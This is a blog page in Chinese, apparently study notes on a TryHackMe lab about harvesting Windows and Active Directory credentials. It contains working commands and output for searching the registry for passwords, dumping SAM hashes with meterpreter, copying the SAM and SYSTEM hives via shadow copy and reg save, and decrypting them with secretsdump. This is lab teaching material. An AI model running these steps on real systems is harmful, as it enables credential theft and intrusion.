@@ -1,0 +1,712 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>THM域学习CredentialsHarvesting | MikannseのSekai</title><meta name="author" content="Mikannse"><meta name="copyright" content="Mikannse"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="Introduction欢迎来到凭证收集 该会议室讨论红队成员利用获得的凭证执行横向移动并访问 AD 环境中的资源的基础知识。我们将展示如何获取、重用和模拟用户凭据。 凭据收集包括获取登录信息、帐户名和密码等凭据的技术。它是一种从系统中不同位置（例如明文文件、注册表、内存转储等）提取凭证信息的技术。 作为红队成员，获得合法凭证有以下好处：  它可以提供对系统的访问（横向移动）。 这使得我们的行为更">
+<meta property="og:type" content="article">
+<meta property="og:title" content="THM域学习CredentialsHarvesting">
+<meta property="og:url" content="http://mikannse.space/2024/05/21/THM%E5%9F%9F%E5%AD%A6%E4%B9%A0CredentialsHarvesting/index.html">
+<meta property="og:site_name" content="MikannseのSekai">
+<meta property="og:description" content="Introduction欢迎来到凭证收集 该会议室讨论红队成员利用获得的凭证执行横向移动并访问 AD 环境中的资源的基础知识。我们将展示如何获取、重用和模拟用户凭据。 凭据收集包括获取登录信息、帐户名和密码等凭据的技术。它是一种从系统中不同位置（例如明文文件、注册表、内存转储等）提取凭证信息的技术。 作为红队成员，获得合法凭证有以下好处：  它可以提供对系统的访问（横向移动）。 这使得我们的行为更">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg">
+<meta property="article:published_time" content="2024-05-21T08:07:01.000Z">
+<meta property="article:modified_time" content="2024-07-14T13:01:13.872Z">
+<meta property="article:author" content="Mikannse">
+<meta property="article:tag" content="笔记">
+<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="Domain">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg"><link rel="shortcut icon" href="/img/icon.jpg"><link rel="canonical" href="http://mikannse.space/2024/05/21/THM%E5%9F%9F%E5%AD%A6%E4%B9%A0CredentialsHarvesting/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"作者: Mikannse","link":"链接: ","source":"来源: MikannseのSekai","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'THM域学习CredentialsHarvesting',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: undefined,
+  isToc: true,
+  postUpdate: '2024-07-14 21:01:13'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+  window.addEventListener('load',() => { preloader.endLoading() })
+
+  if (true) {
+    document.addEventListener('pjax:send', () => { preloader.initLoading() })
+    document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+  }
+})()</script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">274</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">70</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/yjr-1100/Photobag/githubioimg/background_4k.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="MikannseのSekai"><span class="site-name">MikannseのSekai</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">THM域学习CredentialsHarvesting</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-05-21T08:07:01.000Z" title="发表于 2024-05-21 16:07:01">2024-05-21</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-07-14T13:01:13.872Z" title="更新于 2024-07-14 21:01:13">2024-07-14</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E5%AE%89/">网安</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">10.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>38分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="THM域学习CredentialsHarvesting"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>欢迎来到凭证收集</p>
+<p>该会议室讨论红队成员利用获得的凭证执行横向移动并访问 AD 环境中的资源的基础知识。我们将展示如何获取、重用和模拟用户凭据。</p>
+<p>凭据收集包括获取登录信息、帐户名和密码等凭据的技术。它是一种从系统中不同位置（例如明文文件、注册表、内存转储等）提取凭证信息的技术。</p>
+<p>作为红队成员，获得合法凭证有以下好处：</p>
+<ul>
+<li>它可以提供对系统的访问（横向移动）。</li>
+<li>这使得我们的行为更难被发现。</li>
+<li>它提供了创建和管理帐户的机会，以帮助实现红队参与的最终目标。</li>
+</ul>
+<p>学习目标</p>
+<ul>
+<li>了解从本地Windows（SAM数据库）提取凭据的方法</li>
+<li>了解如何在本地和远程访问 Windows 内存并转储明文密码和身份验证票证。</li>
+<li>Windows 凭据管理器简介以及如何提取凭据。</li>
+<li>了解提取域控制器凭据的方法</li>
+<li>枚举本地管理员密码解决方案 (LAPS) 功能。</li>
+<li>介绍导致获取凭据的 AD 攻击。</li>
+</ul>
+<p>房间先决条件</p>
+<p>我们强烈建议您先完成以下 Active Directory 房间，然后再深入此房间：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://tryhackme.com/path-action/jrpenetrationtester/join">Jr. Penetration Tester Path</a></li>
+<li><a target="_blank" rel="noopener" href="https://tryhackme.com/room/activedirectorybasics">Active Directory Basics</a></li>
+<li><a target="_blank" rel="noopener" href="https://tryhackme.com/room/breachingad">Breaching AD</a></li>
+<li><a target="_blank" rel="noopener" href="https://tryhackme.com/room/adenumeration">Enumerating AD</a></li>
+<li><a target="_blank" rel="noopener" href="https://tryhackme.com/room/lateralmovementandpivoting">Lateral Movement and Pivoting</a></li>
+</ul>
+<h1 id="Credentials-Harvesting"><a href="#Credentials-Harvesting" class="headerlink" title="Credentials Harvesting"></a>Credentials Harvesting</h1><p>凭据收集是获取用户和系统凭据访问权限的术语。这是一种查找或窃取存储的凭据的技术，包括网络嗅探，攻击者可以在网络嗅探中捕获传输的凭据。</p>
+<p>凭证可以有多种不同的形式，例如：</p>
+<ul>
+<li>帐户详细信息（用户名和密码）</li>
+<li>包括 NTLM 哈希等的哈希。</li>
+<li>身份验证票证：票证授予票证（TGT）、票证授予服务器（TGS）</li>
+<li>任何有助于登录系统的信息（私钥等）</li>
+</ul>
+<p>一般来说，凭证收集有两种类型：外部和内部。外部凭据收集很可能涉及网络钓鱼电子邮件和其他技术来诱骗用户输入其用户名和密码。如果您想了解有关网络钓鱼电子邮件的更多信息，我们建议尝试 THM <a target="_blank" rel="noopener" href="https://tryhackme.com/room/phishingyl">网络钓鱼</a>room。通过内部网络获取凭据使用不同的方法。</p>
+<p>在这个房间里，重点是从内部角度收集凭证，其中威胁行为者已经破坏了系统并获得了初始访问权限。</p>
+<h1 id="Credential-Access"><a href="#Credential-Access" class="headerlink" title="Credential Access"></a>Credential Access</h1><p>凭据访问是攻击者可能在受感染的系统中找到凭据并获取用户凭据的访问权限的地方。它可以帮助对手重用它们或冒充用户的身份。这是横向移动和访问其他资源（例如其他应用程序或系统）的重要一步。优先获取合法用户凭据，而不是使用 CVE 来利用系统。</p>
+<p>如需了解更多信息，您可以访问 MITRE ATT&amp;CK 框架 (<a target="_blank" rel="noopener" href="https://attack.mitre.org/tropics/TA0006/">TA0006</a>)。</p>
+<p>凭证不安全地存储在系统中的各个位置：</p>
+<ul>
+<li>明文文件</li>
+<li>数据库文件</li>
+<li>内存</li>
+<li>密码管理器</li>
+<li>企业保管库</li>
+<li>活动目录</li>
+<li>网络嗅探</li>
+</ul>
+<p>让我们多讨论一下吧！</p>
+<p>明文文件</p>
+<p>攻击者可能会在受感染的计算机上搜索本地或远程文件系统中的凭据。明文文件可能包含用户创建的敏感信息，其中包含密码、私钥等。MITRE ATT&amp;CK 框架将其定义为 <strong>不安全的凭证：文件中的凭证</strong> ([T1552.001](<a target="_blank" rel="noopener" href="https://attack/">https://attack</a> .mitre.org/techniques/T1552/001/))。</p>
+<p>以下是攻击者可能感兴趣的一些明文文件类型：</p>
+<ul>
+<li>命令历史记录</li>
+<li>配置文件（Web App、FTP 文件等）</li>
+<li>与 Windows 应用程序相关的其他文件（互联网浏览器、电子邮件客户端等）</li>
+<li>备份文件</li>
+<li>共享文件和文件夹</li>
+<li>登记处</li>
+<li>源代码</li>
+</ul>
+<p>作为历史命令的示例，PowerShell 将执行的 PowerShell 命令保存在以下路径的用户配置文件中的历史文件中：<code>C:\Users\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt </code></p>
+<p>检查用户正在做什么或查找敏感信息可能是值得的。另一个例子是寻找有趣的信息。例如，以下命令是在Windows注册表中查找“password”关键字。</p>
+<p> 在注册表中搜索“密码”关键字</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">           c:\Users\user&gt; reg query HKLM /f password /t REG_SZ /s</span><br><span class="line">#OR</span><br><span class="line">C:\Users\user&gt; reg query HKCU /f password /t REG_SZ /s</span><br></pre></td></tr></tbody></table></figure>
+
+<p>数据库文件</p>
+<p>应用程序利用数据库文件来读取或写入设置、配置或凭据。数据库文件通常存储在Windows操作系统本地。这些文件是检查和寻找凭据的绝佳目标。如需了解更多信息，我们建议查看 THM 房间：<a target="_blank" rel="noopener" href="https://tryhackme.com/room/breachingad">Breaching AD</a>。它包含从本地 McAfee Endpoint 数据库文件中提取凭据的展示示例。</p>
+<p>密码管理器</p>
+<p>密码管理器是一种用于存储和管理本地和互联网网站及服务的用户登录信息的应用程序。由于它涉及用户数据，因此必须安全存储以防止未经授权的访问。</p>
+<p>密码管理器应用程序示例：</p>
+<ul>
+<li>内置密码管理器（Windows）</li>
+<li>第三方：KeePass、1Password、LastPass</li>
+</ul>
+<p>然而，这些应用程序中发现了错误配置和安全缺陷，使攻击者可以访问存储的数据。在枚举阶段可以使用各种工具来获取 Internet 浏览器和桌面应用程序使用的密码管理器应用程序中的敏感数据。</p>
+<p>本会议室将讨论如何访问 Windows 凭据管理器并提取密码。</p>
+<p>内存转储</p>
+<p>操作系统的内存是属于 Windows 操作系统、用户和其他应用程序的敏感信息的丰富来源。数据在运行时或执行期间加载到内存中。因此，访问内存仅限于完全控制系统的管理员用户。</p>
+<p>以下是内存存储敏感数据的示例，包括：</p>
+<ul>
+<li>明文凭证</li>
+<li>缓存密码</li>
+<li>AD门票</li>
+</ul>
+<p>在这个房间里，我们将讨论如何访问内存并提取明文密码和身份验证票证。</p>
+<p>活动目录</p>
+<p>Active Directory存储了大量与用户、组、计算机等相关的信息。因此，枚举Active Directory环境是红队评估的重点之一。 Active Directory 具有可靠的设计，但管理员的错误配置使其容易受到本房间所示的各种攻击。</p>
+<p>以下是一些可能泄露用户凭据的 Active Directory 错误配置。</p>
+<ul>
+<li><strong>用户描述</strong>：管理员在新员工的描述中设置密码并将其留在那里，这使得该帐户容易受到未经授权的访问。</li>
+<li><strong>组策略 SYSVOL</strong>：泄露的加密密钥让攻击者可以访问管理员帐户。检查任务 8 以获取有关 SYSVOL 易受攻击版本的更多信息。</li>
+<li><strong>NTDS：</strong> 包含 AD 用户的凭据，使其成为攻击者的目标。</li>
+<li><strong>AD 攻击：</strong> 错误配置使 AD 容易受到各种攻击，我们将在任务 9 中讨论。</li>
+</ul>
+<p>网络嗅探</p>
+<p>获得对目标网络的初始访问权限使攻击者能够对本地计算机（包括 AD 环境）执行各种网络攻击。针对网络协议的中间人攻击使攻击者可以在网络内创建流氓或欺骗性受信任资源，以窃取身份验证信息，例如 NTLM 哈希值。</p>
+<h1 id="Local-Windows-Credentials"><a href="#Local-Windows-Credentials" class="headerlink" title="Local Windows Credentials"></a>Local Windows Credentials</h1><p>一般来说，Windows操作系统提供两种类型的用户帐户：本地和域。本地用户的详细信息存储在本地 Windows 文件系统中，而域用户的详细信息存储在集中式 Active Directory 中。此任务讨论本地用户帐户的凭据并演示如何获取它们。</p>
+<p>击键</p>
+<p>键盘记录器是一种用于监视和记录键盘打字活动的软件或硬件设备。键盘记录器最初是为了合法目的而设计的，例如软件开发或家长控制的反馈。然而，它们可能被滥用来窃取数据。作为红队成员，在繁忙的交互式环境中通过键盘记录器寻找凭据是一个不错的选择。如果我们知道受感染的目标有登录用户，我们可以使用 Metasploit 框架或其他工具来执行键盘记录。</p>
+<p>我们有一个在另一个 THM 房间中使用 Metasploit 通过击键来利用用户的用例示例。有关更多信息，您应该查看 THM <a target="_blank" rel="noopener" href="https://tryhackme.com/room/exploitingad">利用 AD</a>（任务 5）。</p>
+<p>安全客户经理 (SAM)</p>
+<p>SAM 是一个 Microsoft Windows 数据库，其中包含本地帐户信息，例如用户名和密码。 SAM 数据库以加密格式存储这些详细信息，使其更难检索。而且，当Windows操作系统运行时，任何用户都无法读取和访问它。然而，转储 SAM 数据库内容的方法和攻击有多种。</p>
+<p>首先，确保您已部署提供的虚拟机，然后确认我们无法复制或读取 <code>c:\Windows\System32\config\sam</code> 文件：</p>
+<p> 确认无法访问 SAM 数据库</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line"> C:\Windows\system32&gt;type c:\Windows\System32\config\sam</span><br><span class="line">type c:\Windows\System32\config\sam</span><br><span class="line">The process cannot access the file because it is being used by another process.</span><br><span class="line"></span><br><span class="line">C:\Windows\System32&gt; copy c:\Windows\System32\config\sam C:\Users\Administrator\Desktop\ </span><br><span class="line">copy c:\Windows\System32\config\sam C:\Users\Administrator\Desktop\</span><br><span class="line">The process cannot access the file because it is being used by another process.</span><br><span class="line">        0 file(s) copied. </span><br></pre></td></tr></tbody></table></figure>
+
+<p>Metasploit 的 HashDump</p>
+<p>第一种方法是使用内置的 Metasploit 框架功能 hashdump 来获取 SAM 数据库内容的副本。 Metasploit 框架使用内存中代码注入 LSASS.exe 进程来转储副本哈希。有关 hashdump 的更多信息，您可以访问 <a target="_blank" rel="noopener" href="https://www.rapid7.com/blog/post/2010/01/01/safe-reliable-hash-dumping/">rapid7 </a>博客。我们将在另一个任务中讨论直接从 LSASS.exe 进程转储凭据！</p>
+<p>​            Dumping the SAM database content        </p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">           meterpreter &gt; getuid</span><br><span class="line">Server username: THM\Administrator</span><br><span class="line">meterpreter &gt; hashdump</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:98d3b784d80d18385cea5ab3aa2a4261:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ec44ddf5ae100b898e9edab74811430d:::</span><br><span class="line">CREDS-HARVESTIN$:1008:aad3b435b51404eeaad3b435b51404ee:443e64439a4b7fe780db47fc06a3342d:::</span><br></pre></td></tr></tbody></table></figure>
+
+<p>卷影复制服务</p>
+<p>另一种方法使用 Microsoft 卷影复制服务，该服务有助于在应用程序在卷上读/写时执行卷备份。您可以访问 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service">Microsoft 文档页面</a> 了解有关该服务的更多信息。</p>
+<p>更具体地说，我们将使用 wmic 创建卷影副本。这必须通过具有<strong>管理员权限</strong>的命令提示符来完成，如下所示，</p>
+<ol>
+<li>使用管理员权限运行标准 cmd.exe 提示符。<br>2.执行wmic命令创建C:盘的副本影子</li>
+<li>验证步骤 2 中的创建是否可用。</li>
+<li>从我们在步骤 2 中创建的卷中复制 SAM 数据库</li>
+</ol>
+<p>现在让我们应用上面讨论的内容并以管理员权限运行 cmd.exe。然后执行以下wmic命令：</p>
+<p> 使用 WMIC 创建卷 C 的卷影副本</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">           C:\Users\Administrator&gt;wmic shadowcopy call create Volume='C:\'</span><br><span class="line">Executing (Win32_ShadowCopy)-&gt;create()</span><br><span class="line">Method execution successful.</span><br><span class="line">Out Parameters:</span><br><span class="line">instance of __PARAMETERS</span><br><span class="line">{</span><br><span class="line">        ReturnValue = 0;</span><br><span class="line">        ShadowID = "{D8A11619-474F-40AE-A5A0-C2FAA1D78B85}";</span><br><span class="line">};</span><br><span class="line">        </span><br></pre></td></tr></tbody></table></figure>
+
+<p>成功执行命令后，让我们使用卷影复制服务管理命令行工具“vssadmin”来列出并确认我们拥有“C:”卷的卷影副本。</p>
+<p>列出可用的影子卷</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">           C:\Users\Administrator&gt;vssadmin list shadows</span><br><span class="line">vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool</span><br><span class="line">(C) Copyright 2001-2013 Microsoft Corp.</span><br><span class="line"></span><br><span class="line">Contents of shadow copy set ID: {0c404084-8ace-4cb8-a7ed-7d7ec659bb5f}</span><br><span class="line">   Contained 1 shadow copies at creation time: 5/31/2022 1:45:05 PM</span><br><span class="line">      Shadow Copy ID: {d8a11619-474f-40ae-a5a0-c2faa1d78b85}</span><br><span class="line">         Original Volume: (C:)\\?\Volume{19127295-0000-0000-0000-100000000000}\</span><br><span class="line">         Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1</span><br><span class="line">         Originating Machine: Creds-Harvesting-AD.thm.red</span><br><span class="line">         Service Machine: Creds-Harvesting-AD.thm.red</span><br><span class="line">         Provider: 'Microsoft Software Shadow Copy provider 1.0'</span><br><span class="line">         Type: ClientAccessible</span><br><span class="line">         Attributes: Persistent, Client-accessible, No auto release, No writers, Differential</span><br><span class="line"></span><br><span class="line">        </span><br></pre></td></tr></tbody></table></figure>
+
+<p>输出显示我们已成功创建卷影副本卷 (C:)，路径如下：“\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1”。</p>
+<p>如前所述，SAM 数据库使用 <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/RC4">RC4</a> 或 <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Advanced_Encryption_Standard">AES</a> 加密算法进行加密。为了解密它，我们需要一个解密密钥，该密钥也存储在文件系统中的“c:\Windows\System32\Config\system”中。</p>
+<p>现在让我们将两个文件（sam 和 system）从我们生成的卷影副本卷复制到桌面，如下所示，</p>
+<p> 从Shadow Volume复制SAM和SYSTEM文件</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">           C:\Users\Administrator&gt;copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\Administrator\Desktop\sam</span><br><span class="line">        1 file(s) copied.</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator&gt;copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\Administrator\Desktop\system</span><br><span class="line">        1 file(s) copied.</span><br><span class="line">        </span><br></pre></td></tr></tbody></table></figure>
+
+<p>现在我们有了两个必需的文件，用您最喜欢的方法将它们传输到 AttackBox（SCP 应该可以）。</p>
+<p>注册表蜂巢</p>
+<p>转储 SAM 数据库内容的另一种可能方法是通过 Windows 注册表。 Windows 注册表还存储 Windows 服务使用的一些 SAM 数据库内容的副本。幸运的是，我们可以使用 reg.exe 工具保存 Windows 注册表的值。如前所述，我们需要两个文件来解密 SAM 数据库的内容。确保您以管理员权限运行命令提示符。</p>
+<p> 从注册表中保存SAM和SYSTEM文件</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">           C:\Users\Administrator\Desktop&gt;reg save HKLM\sam C:\users\Administrator\Desktop\sam-reg</span><br><span class="line">The operation completed successfully.</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator\Desktop&gt;reg save HKLM\system C:\users\Administrator\Desktop\system-reg</span><br><span class="line">The operation completed successfully.</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator\Desktop&gt;</span><br><span class="line">        </span><br></pre></td></tr></tbody></table></figure>
+
+<p>这次我们使用 Impacket 工具之一来解密：“secretsdump.py”，该工具已安装在 AttackBox 中。 Impacket SecretsDump 脚本使用不同的技术从本地和远程系统中提取凭据。</p>
+<p>将 SAM 和系统文件移至 AttackBox 并运行以下命令：</p>
+<p> 在本地使用 Impacket SecretsDump 脚本解密 SAM 数据库</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">           user@machine:~# python3.9 /opt/impacket/examples/secretsdump.py -sam /tmp/sam-reg -system /tmp/system-reg LOCAL</span><br><span class="line">Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821</span><br><span class="line">[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:98d3a787a80d08385cea7fb4aa2a4261:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.</span><br><span class="line">[*] Cleaning up...</span><br><span class="line">        </span><br></pre></td></tr></tbody></table></figure>
+
